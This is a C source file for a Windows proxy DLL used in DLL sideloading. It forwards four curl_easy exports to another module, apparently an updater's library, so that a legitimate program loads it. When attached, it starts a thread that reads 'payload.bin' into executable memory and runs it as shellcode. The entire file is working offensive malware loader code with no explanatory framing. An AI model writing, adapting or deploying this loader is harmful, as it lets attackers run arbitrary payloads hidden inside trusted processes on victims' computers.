#include "pch.h"
#include <stdio.h>
#include <stdlib.h>

#define _CRT_SECURE_NO_DEPRECATE
#pragma warning (disable : 4996)

#pragma comment(linker, "/export:curl_easy_cleanup=gup.curl_easy_cleanup,@1")
#pragma comment(linker, "/export:curl_easy_init=gup.curl_easy_init,@6")
#pragma comment(linker, "/export:curl_easy_perform=gup.curl_easy_perform,@12")
#pragma comment(linker, "/export:curl_easy_setopt=gup.curl_easy_setopt,@16")

DWORD WINAPI DoMagic(LPVOID lpParameter)
{
    FILE* fp;
    size_t size;
    unsigned char* buffer;

    fp = fopen("payload.bin", "rb");
    fseek(fp, 0, SEEK_END);
    size = ftell(fp);
    fseek(fp, 0, SEEK_SET);
    buffer = (unsigned char*)malloc(size);

    fread(buffer, size, 1, fp);

    void* exec = VirtualAlloc(0, size, MEM_COMMIT, PAGE_EXECUTE_READWRITE);

    memcpy(exec, buffer, size);

    ((void(*) ())exec)();

    return 0;
}

BOOL APIENTRY DllMain(HMODULE hModule,
    DWORD ul_reason_for_call,
    LPVOID lpReserved
)
{
    HANDLE threadHandle;

    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH: 
        threadHandle = CreateThread(NULL, 0, DoMagic, NULL, 0, NULL);
        CloseHandle(threadHandle);
        break;
    case DLL_THREAD_ATTACH:
        break;
    case DLL_THREAD_DETACH:
        break;
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}